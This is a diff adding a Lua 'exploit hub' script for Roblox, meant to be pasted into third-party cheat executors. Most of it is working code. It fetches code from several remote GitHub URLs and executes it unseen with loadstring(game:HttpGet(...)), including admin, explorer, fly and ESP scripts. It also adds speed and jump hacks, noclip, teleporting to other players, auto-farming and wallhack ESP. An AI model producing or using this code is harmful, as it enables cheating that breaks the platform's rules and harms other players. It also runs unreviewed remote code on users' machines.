@@ -1,0 +1,181 @@
+-- Roblox Exploit Script Hub (Universal Loadstring Executor)
+-- Use with exploits like Synapse X, Krnl, Fluxus, etc.
+-- Paste this into your exploit executor!
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Popular Script Hubs (Loadstrings)
+local hubs = {
+    -- Infinite Yield (Admin Commands)
+    "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source",
+    
+    -- Dark Dex (Explorer)
+    "https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua",
+    
+    -- Owl Hub (Multiple Games)
+    "https://raw.githubusercontent.com/owlscript/RBLX/main/OwllHub",
+    
+    -- Reviz Admin
+    "https://raw.githubusercontent.com/RevizAdmin/RevizAdmin/main/source",
+    
+    -- Dex Explorer
+    "https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/Dex%20Explorer.lua"
+}
+
+-- Auto-Executor Function
+local function loadScript(url)
+    local success, result = pcall(function()
+        return game:HttpGet(url)
+    end)
+    
+    if success and result then
+        loadstring(result)()
+        print("✅ Loaded: " .. url)
+        return true
+    else
+        warn("❌ Failed to load: " .. url)
+        return false
+    end
+end
+
+-- Main Menu GUI
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Roblox Exploit Hub", "DarkTheme")
+
+-- Tabs
+local MainTab = Window:NewTab("Main Exploits")
+local PlayerTab = Window:NewTab("Player Mods")
+local TeleportTab = Window:NewTab("Teleport")
+local MiscTab = Window:NewTab("Misc")
+
+-- Main Exploits Section
+local MainSection = MainTab:NewSection("Script Hubs")
+for i, hub in ipairs(hubs) do
+    MainSection:NewButton({
+        "Load Hub " .. i,
+        "Loads popular exploit hub",
+        function()
+            loadScript(hub)
+        end
+    })
+end
+
+-- Player Section (Speed, Jump, Fly)
+local PlayerSection = PlayerTab:NewSection("Player Mods")
+PlayerSection:NewSlider({
+    "WalkSpeed",
+    "Modify your walkspeed",
+    500,
+    16,
+    function(s)
+        LocalPlayer.Character.Humanoid.WalkSpeed = s
+    end
+})
+
+PlayerSection:NewSlider({
+    "JumpPower",
+    "Modify your jump power",
+    500,
+    50,
+    function(s)
+        LocalPlayer.Character.Humanoid.JumpPower = s
+    end
+})
+
+-- Fly Toggle
+local flying = false
+PlayerSection:NewToggle({
+    "Fly",
+    "Toggle flying",
+    function(state)
+        flying = state
+        if flying then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/LEOX00/Speedhub/main/Fly.lua"))()
+        end
+    end
+})
+
+-- Teleport Section
+local TeleportSection = TeleportTab:NewSection("Popular Teleports")
+TeleportSection:NewButton({
+    "Teleport to Random Player",
+    "TP to random player",
+    function()
+        local players = Players:GetPlayers()
+        if #players > 1 then
+            local target = players[math.random(2, #players)]
+            LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
+        end
+    end
+})
+
+-- Noclip Toggle
+local noclipping = false
+MiscTab:NewSection("Noclip")
+MiscTab:NewToggle({
+    "Noclip",
+    "Toggle noclip",
+    function(state)
+        noclipping = state
+        local function noclip()
+            for _, part in pairs(LocalPlayer.Character:GetChildren()) do
+                if part:IsA("BasePart") then
+                    part.CanCollide = false
+                end
+            end
+        end
+        if noclipping then
+            game:GetService("RunService").Stepped:Connect(noclip)
+        end
+    end
+})
+
+-- Infinite Yield Button (Most Popular)
+MainSection:NewButton({
+    "Load Infinite Yield (Admin)",
+    "Best admin script",
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+    end
+})
+
+-- Auto-Farm Toggle (Generic)
+MiscTab:NewSection("Auto Farm")
+MiscTab:NewToggle({
+    "Auto Farm (Generic)",
+    "Basic auto farm loop",
+    function(state)
+        if state then
+            spawn(function()
+                while _G.AutoFarm do
+                    -- Replace with game-specific farm
+                    for _, obj in pairs(workspace:GetChildren()) do
+                        if obj.Name == "Coin" or obj:FindFirstChild("Collect") then
+                            firetouchinterest(LocalPlayer.Character.HumanoidRootPart, obj, 0)
+                            wait(0.1)
+                        end
+                    end
+                    wait(0.5)
+                end
+            end)
+            _G.AutoFarm = true
+        else
+            _G.AutoFarm = false
+        end
+    end
+})
+
+-- ESP Toggle
+MiscTab:NewToggle({
+    "Player ESP",
+    "See all players through walls",
+    function(state)
+        if state then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/LEOX00/Speedhub/main/ESP.lua"))()
+        end
+    end
+})
+
+print("🎉 Exploit Hub Loaded! GUI will appear on screen.")
